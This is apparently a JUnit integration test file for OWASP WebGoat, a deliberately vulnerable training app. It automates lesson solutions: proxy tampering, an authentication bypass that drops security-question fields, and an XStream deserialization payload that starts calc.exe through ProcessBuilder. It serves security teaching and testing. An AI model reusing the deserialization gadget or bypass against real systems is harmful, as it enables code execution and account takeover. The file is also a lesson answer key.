package org.owasp.webgoat;

import io.restassured.RestAssured;
import io.restassured.http.ContentType;
import java.util.HashMap;
import java.util.Map;
import org.hamcrest.CoreMatchers;
import org.hamcrest.MatcherAssert;
import org.junit.jupiter.api.Test;
import org.springframework.util.StringUtils;

public class GeneralLessonIntegrationTest extends IntegrationTest {

  @Test
  public void httpBasics() {
    startLesson("HttpBasics");
    Map<String, Object> params = new HashMap<>();
    params.clear();
    params.put("person", "goatuser");
    checkAssignment(url("HttpBasics/attack1"), params, true);

    params.clear();
    params.put("answer", "POST");
    params.put("magic_answer", "33");
    params.put("magic_num", "4");
    checkAssignment(url("HttpBasics/attack2"), params, false);

    params.clear();
    params.put("answer", "POST");
    params.put("magic_answer", "33");
    params.put("magic_num", "33");
    checkAssignment(url("HttpBasics/attack2"), params, true);

    checkResults("HttpBasics");
  }

  @Test
  public void solveAsOtherUserHttpBasics() {
    login("steven");
    startLesson("HttpBasics");
    Map<String, Object> params = new HashMap<>();
    params.clear();
    params.put("person", "goatuser");
    checkAssignment(url("HttpBasics/attack1"), params, true);
  }

  @Test
  public void httpProxies() {
    startLesson("HttpProxies");
    MatcherAssert.assertThat(
        RestAssured.given()
            .when()
            .relaxedHTTPSValidation()
            .cookie("JSESSIONID", getWebGoatCookie())
            .header("x-request-intercepted", "true")
            .contentType(ContentType.JSON)
            .get(url("HttpProxies/intercept-request?changeMe=Requests are tampered easily"))
            .then()
            .statusCode(200)
            .extract()
            .path("lessonCompleted"),
        CoreMatchers.is(true));

    checkResults("HttpProxies");
  }

  @Test
  public void cia() {
    startLesson("CIA");
    Map<String, Object> params = new HashMap<>();
    params.clear();
    params.put(
        "question_0_solution",
        "Solution 3: By stealing a database where names and emails are stored and uploading it to a"
            + " website.");
    params.put(
        "question_1_solution",
        "Solution 1: By changing the names and emails of one or more users stored in a database.");
    params.put(
        "question_2_solution",
        "Solution 4: By launching a denial of service attack on the servers.");
    params.put(
        "question_3_solution",
        "Solution 2: The systems security is compromised even if only one goal is harmed.");
    checkAssignment(url("cia/quiz"), params, true);
    checkResults("CIA");
  }

  @Test
  public void vulnerableComponents() {
    if (StringUtils.hasText(System.getProperty("running.in.docker"))) {
      String solution =
          "<contact class='dynamic-proxy'>\n"
              + "<interface>org.owasp.webgoat.lessons.vulnerablecomponents.Contact</interface>\n"
              + "  <handler class='java.beans.EventHandler'>\n"
              + "    <target class='java.lang.ProcessBuilder'>\n"
              + "      <command>\n"
              + "        <string>calc.exe</string>\n"
              + "      </command>\n"
              + "    </target>\n"
              + "    <action>start</action>\n"
              + "  </handler>\n"
              + "</contact>";
      startLesson("VulnerableComponents");
      Map<String, Object> params = new HashMap<>();
      params.clear();
      params.put("payload", solution);
      checkAssignment(url("VulnerableComponents/attack1"), params, true);
      checkResults("VulnerableComponents");
    }
  }

  @Test
  public void insecureLogin() {
    startLesson("InsecureLogin");
    Map<String, Object> params = new HashMap<>();
    params.clear();
    params.put("username", "CaptainJack");
    params.put("password", "BlackPearl");
    checkAssignment(url("InsecureLogin/task"), params, true);
    checkResults("InsecureLogin");
  }

  @Test
  public void securePasswords() {
    startLesson("SecurePasswords");
    Map<String, Object> params = new HashMap<>();
    params.clear();
    params.put("password", "ajnaeliclm^&&@kjn.");
    checkAssignment(url("SecurePasswords/assignment"), params, true);
    checkResults("SecurePasswords");

    startLesson("AuthBypass");
    params.clear();
    params.put("secQuestion2", "John");
    params.put("secQuestion3", "Main");
    params.put("jsEnabled", "1");
    params.put("verifyMethod", "SEC_QUESTIONS");
    params.put("userId", "12309746");
    checkAssignment(url("auth-bypass/verify-account"), params, true);
    checkResults("AuthBypass");

    startLesson("HttpProxies");
    MatcherAssert.assertThat(
        RestAssured.given()
            .when()
            .relaxedHTTPSValidation()
            .cookie("JSESSIONID", getWebGoatCookie())
            .header("x-request-intercepted", "true")
            .contentType(ContentType.JSON)
            .get(url("HttpProxies/intercept-request?changeMe=Requests are tampered easily"))
            .then()
            .statusCode(200)
            .extract()
            .path("lessonCompleted"),
        CoreMatchers.is(true));
    checkResults("HttpProxies");
  }

  @Test
  public void chrome() {
    startLesson("ChromeDevTools");

    Map<String, Object> params = new HashMap<>();
    params.clear();
    params.put("param1", "42");
    params.put("param2", "24");

    String result =
        RestAssured.given()
            .when()
            .relaxedHTTPSValidation()
            .cookie("JSESSIONID", getWebGoatCookie())
            .header("webgoat-requested-by", "dom-xss-vuln")
            .header("X-Requested-With", "XMLHttpRequest")
            .formParams(params)
            .post(url("CrossSiteScripting/phone-home-xss"))
            .then()
            .statusCode(200)
            .extract()
            .path("output");
    String secretNumber = result.substring("phoneHome Response is ".length());

    params.clear();
    params.put("successMessage", secretNumber);
    checkAssignment(url("ChromeDevTools/dummy"), params, true);

    params.clear();
    params.put("number", "24");
    params.put("network_num", "24");
    checkAssignment(url("ChromeDevTools/network"), params, true);

    checkResults("ChromeDevTools");
  }

  @Test
  public void authByPass() {
    startLesson("AuthBypass");
    Map<String, Object> params = new HashMap<>();
    params.clear();
    params.put("secQuestion2", "John");
    params.put("secQuestion3", "Main");
    params.put("jsEnabled", "1");
    params.put("verifyMethod", "SEC_QUESTIONS");
    params.put("userId", "12309746");
    checkAssignment(url("auth-bypass/verify-account"), params, true);
    checkResults("AuthBypass");
  }

  @Test
  public void lessonTemplate() {
    startLesson("LessonTemplate");
    Map<String, Object> params = new HashMap<>();
    params.clear();
    params.put("param1", "secr37Value");
    params.put("param2", "Main");
    checkAssignment(url("lesson-template/sample-attack"), params, true);
    checkResults("LessonTemplate");
  }
}
